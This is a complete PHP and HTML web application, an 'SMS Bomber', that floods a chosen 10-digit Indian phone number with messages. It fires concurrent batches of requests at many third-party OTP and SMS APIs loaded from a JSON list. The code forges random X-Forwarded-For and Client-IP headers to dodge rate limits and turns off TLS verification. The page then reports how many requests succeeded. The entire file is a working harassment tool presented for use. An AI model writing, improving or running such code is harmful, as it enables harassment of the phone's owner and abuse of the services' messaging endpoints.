<?php
error_reporting(0);
set_time_limit(300);

if (isset($_GET['submit'])) {
    $mobile = preg_replace('/[^0-9]/', '', $_REQUEST['mobile']);

    function generateRandomIP() {
        return rand(1, 255) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(1, 255);
    }

    function makeRequest($api, $mobile) {
        $url = str_replace(["{no}", "{cc}", "{dur}"], [$mobile, "91", "1"], $api['url']);
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $api['method']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
        curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, false);
        curl_setopt($ch, CURLOPT_HEADER, false);
        
        $headers = [];
        if (isset($api['headers'])) {
            foreach ($api['headers'] as $key => $value) {
                $headers[] = "$key: $value";
            }
        }
        $headers[] = "X-Forwarded-For: " . generateRandomIP();
        $headers[] = "Client-IP: " . generateRandomIP();
        $headers[] = "Accept-Language: en-US,en;q=0.9";
        $headers[] = "Cache-Control: no-cache";
        $headers[] = "Pragma: no-cache";
        $headers[] = "Connection: close";
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        if (isset($api['body']) && !empty($api['body']) && $api['method'] !== 'GET') {
            if (is_array($api['body'])) {
                $body = json_encode($api['body']);
                $body = str_replace(["{no}", "{cc}"], [$mobile, "91"], $body);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
            } else {
                $body = str_replace(["{no}", "{cc}"], [$mobile, "91"], $api['body']);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
            }
        }
        
        $start = microtime(true);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $timeTaken = round((microtime(true) - $start) * 1000);
        
        curl_close($ch);
        
        return [
            "name" => $api['name'],
            "httpCode" => $httpCode,
            "time" => $timeTaken,
            "success" => ($httpCode >= 200 && $httpCode < 300) ? true : false,
            "response" => $response ? json_decode($response, true) : null
        ];
    }

    function makeConcurrentRequests($apis, $mobile, $batchSize = 80) {
        $results = [];
        $totalApis = count($apis);
        
        $batches = array_chunk($apis, $batchSize);
        
        foreach ($batches as $batchIndex => $batch) {
            $mh = curl_multi_init();
            $curlHandles = [];
            $active = null;
            
            foreach ($batch as $api) {
                $url = str_replace(["{no}", "{cc}", "{dur}"], [$mobile, "91", "1"], $api['url']);
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $api['method']);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_TIMEOUT, 2);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
                curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
                curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
                curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, false);
                curl_setopt($ch, CURLOPT_HEADER, false);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 2);
                
                $headers = [];
                if (isset($api['headers'])) {
                    foreach ($api['headers'] as $key => $value) {
                        $headers[] = "$key: $value";
                    }
                }
                $headers[] = "X-Forwarded-For: " . generateRandomIP();
                $headers[] = "Connection: close";
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                
                if (isset($api['body']) && !empty($api['body']) && $api['method'] !== 'GET') {
                    if (is_array($api['body'])) {
                        $body = json_encode($api['body']);
                        $body = str_replace(["{no}", "{cc}"], [$mobile, "91"], $body);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
                    } else {
                        $body = str_replace(["{no}", "{cc}"], [$mobile, "91"], $api['body']);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
                    }
                }
                
                curl_multi_add_handle($mh, $ch);
                $curlHandles[] = ['handle' => $ch, 'name' => $api['name'], 'api' => $api];
            }
            
            do {
                curl_multi_exec($mh, $active);
                if ($active) {
                    curl_multi_select($mh, 0.05);
                }
            } while ($active);
            
            foreach ($curlHandles as $item) {
                $httpCode = curl_getinfo($item['handle'], CURLINFO_HTTP_CODE);
                $response = curl_multi_getcontent($item['handle']);
                $results[$item['name']] = [
                    "name" => $item['name'],
                    "httpCode" => $httpCode,
                    "success" => ($httpCode >= 200 && $httpCode < 300),
                    "response" => $response ? json_decode($response, true) : null
                ];
                curl_multi_remove_handle($mh, $item['handle']);
                curl_close($item['handle']);
            }
            
            curl_multi_close($mh);
            
            if ($batchIndex < count($batches) - 1) {
                usleep(100000);
            }
        }
        
        return $results;
    }

    if (strlen($mobile) == 10) {
        $message = "SMS Bombing started on $mobile";
        
        $apiJson = file_get_contents('kalki.json');
        $apis = json_decode($apiJson, true);
        
        if ($apis) {
            shuffle($apis);
            $startTime = microtime(true);
            $results = makeConcurrentRequests($apis, $mobile, 100);
            $totalTime = round(microtime(true) - $startTime, 2);
            
            $successful = count(array_filter($results, function($r) { return $r['success']; }));
            $failed = count($results) - $successful;
        }
    } else {
        $message = "Please enter a valid 10-digit number";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Bomber - Turbo</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width:1200px; margin:0 auto; }
        h2 {
            color: #00ff41;
            text-align: center;
            font-size: 2.5em;
            margin-bottom: 30px;
            text-shadow: 0 0 20px rgba(0,255,65,0.3);
            font-weight: 700;
        }
        .form-card {
            background: #1a1a1a;
            padding: 30px;
            border-radius: 15px;
            border: 1px solid #00ff41;
            margin-bottom: 30px;
        }
        label {
            color: #00ff41;
            font-weight: 600;
            font-size: 1.1em;
            display:block;
            margin-bottom:10px;
        }
        .input-group {
            display:flex;
            gap:10px;
        }
        input[type="text"] {
            flex:1;
            padding:15px;
            border:2px solid #00ff41;
            border-radius:8px;
            font-size:1.1em;
            background:#0a0a0a;
            color:#00ff41;
            transition:0.3s;
            font-weight:600;
            letter-spacing:2px;
        }
        input[type="text"]:focus {
            outline:none;
            box-shadow:0 0 20px rgba(0,255,65,0.3);
        }
        button {
            background:#00ff41;
            color:#0a0a0a;
            padding:15px 30px;
            border:none;
            border-radius:8px;
            font-size:1.1em;
            font-weight:700;
            cursor:pointer;
            transition:0.3s;
            white-space:nowrap;
            text-transform:uppercase;
            letter-spacing:1px;
        }
        button:hover {
            transform:scale(1.05);
            box-shadow:0 0 30px rgba(0,255,65,0.5);
        }
        .stats-card {
            background:#1a1a1a;
            padding:25px;
            border-radius:15px;
            border:1px solid #00ff41;
            margin-bottom:30px;
        }
        .stats-card h3 { color:#00ff41; margin-bottom:15px; }
        .stats-grid {
            display:grid;
            grid-template-columns:repeat(auto-fit, minmax(150px,1fr));
            gap:15px;
        }
        .stat-item {
            text-align:center;
            padding:15px;
            border-radius:10px;
            background:#0a0a0a;
            border:1px solid #00ff41;
        }
        .stat-value {
            font-size:2.5em;
            font-weight:700;
            color:#00ff41;
        }
        .stat-label {
            color:#00ff41;
            font-size:0.85em;
            text-transform:uppercase;
            letter-spacing:1px;
            opacity:0.7;
        }
        .success { color:#00ff41; }
        .failed { color:#ff0040; }
        .progress-bar {
            width:100%;
            height:6px;
            background:#0a0a0a;
            border-radius:3px;
            overflow:hidden;
            margin-top:15px;
            border:1px solid #00ff41;
        }
        .progress-fill {
            height:100%;
            background:#00ff41;
            transition:width 0.5s;
        }
        .results-grid {
            display:grid;
            grid-template-columns:repeat(auto-fill, minmax(350px,1fr));
            gap:10px;
        }
        .result-card {
            background:#1a1a1a;
            padding:12px 15px;
            border-radius:8px;
            border:1px solid #333;
            transition:0.3s;
        }
        .result-card:hover {
            border-color:#00ff41;
            transform:translateY(-2px);
        }
        .result-header {
            display:flex;
            justify-content:space-between;
            align-items:center;
            cursor:pointer;
        }
        .api-name {
            color:#fff;
            font-weight:600;
            font-size:0.9em;
        }
        .status-badge {
            padding:2px 10px;
            border-radius:4px;
            font-size:0.8em;
            font-weight:700;
        }
        .status-success {
            background:#00ff4122;
            color:#00ff41;
            border:1px solid #00ff41;
        }
        .status-failed {
            background:#ff004022;
            color:#ff0040;
            border:1px solid #ff0040;
        }
        .http-code { color:#888; font-size:0.85em; margin-top:5px; }
        .response-toggle {
            color:#00ff41;
            font-size:0.75em;
            cursor:pointer;
            opacity:0.6;
        }
        .response-toggle:hover { opacity:1; }
        .response-body {
            display:none;
            background:#0a0a0a;
            padding:10px;
            border-radius:5px;
            margin-top:8px;
            border-left:2px solid #00ff41;
            overflow-x:auto;
        }
        .response-body.active { display:block; }
        .response-body pre {
            color:#00ff41;
            font-size:0.75em;
            white-space:pre-wrap;
            word-wrap:break-word;
            margin:0;
            font-family:'Courier New',monospace;
        }
        .message {
            background:#00ff4122;
            color:#00ff41;
            padding:15px;
            border-radius:8px;
            margin-bottom:20px;
            text-align:center;
            font-weight:600;
            border:1px solid #00ff41;
        }
        .arrow {
            display:inline-block;
            transition:0.3s;
            margin-left:8px;
        }
        .arrow.rotated { transform:rotate(180deg); }
        @media (max-width:768px) {
            .input-group { flex-direction:column; }
            button { width:100%; }
            .stats-grid { grid-template-columns:1fr 1fr; }
            .results-grid { grid-template-columns:1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>⚡ SMS BOMBER ⚡</h2>
        
        <div class="form-card">
            <form method="GET">
                <label>📱 Phone Number (10 digits):</label>
                <div class="input-group">
                    <input type="text" name="mobile" required pattern="^\d{10}$" 
                           placeholder="9876543210"
                           value="<?= isset($_GET['mobile']) ? htmlspecialchars($_GET['mobile']) : '' ?>">
                    <button type="submit" name="submit" value="bomb">🚀 START</button>
                </div>
            </form>
        </div>
        
        <?php if (isset($message)): ?>
            <div class="message">
                <?= $message; ?>
                <?php if (isset($totalTime)): ?>
                    <br><small>⚡ <?= $totalTime; ?> seconds</small>
                <?php endif; ?>
            </div>
        <?php endif; ?>
        
        <?php if (isset($results)): ?>
            <div class="stats-card">
                <h3>📊 STATISTICS</h3>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value"><?= count($results); ?></div>
                        <div class="stat-label">Total</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value success"><?= $successful; ?></div>
                        <div class="stat-label">Success</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value failed"><?= $failed; ?></div>
                        <div class="stat-label">Failed</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value"><?= round($successful / count($results) * 100); ?>%</div>
                        <div class="stat-label">Rate</div>
                    </div>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" style="width: <?= round($successful / count($results) * 100); ?>%"></div>
                </div>
            </div>
            
            <div class="results-grid">
                <?php foreach ($results as $result): ?>
                    <div class="result-card" onclick="toggleResponse(this)">
                        <div class="result-header">
                            <span class="api-name"><?= htmlspecialchars($result['name']); ?></span>
                            <span>
                                <span class="status-badge <?= $result['success'] ? 'status-success' : 'status-failed'; ?>">
                                    <?= $result['httpCode']; ?>
                                </span>
                                <span class="arrow">▼</span>
                            </span>
                        </div>
                        <div class="http-code"><?= $result['success'] ? '✅ Success' : '❌ Failed'; ?></div>
                        <?php if ($result['response']): ?>
                            <div class="response-body">
                                <pre><?= htmlspecialchars(json_encode($result['response'], JSON_PRETTY_PRINT)); ?></pre>
                            </div>
                        <?php endif; ?>
                    </div>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>
    </div>

    <script>
        function toggleResponse(card) {
            var body = card.querySelector('.response-body');
            var arrow = card.querySelector('.arrow');
            if (body) {
                body.classList.toggle('active');
                if (arrow) {
                    arrow.classList.toggle('rotated');
                }
            }
        }
    </script>
</body>
</html>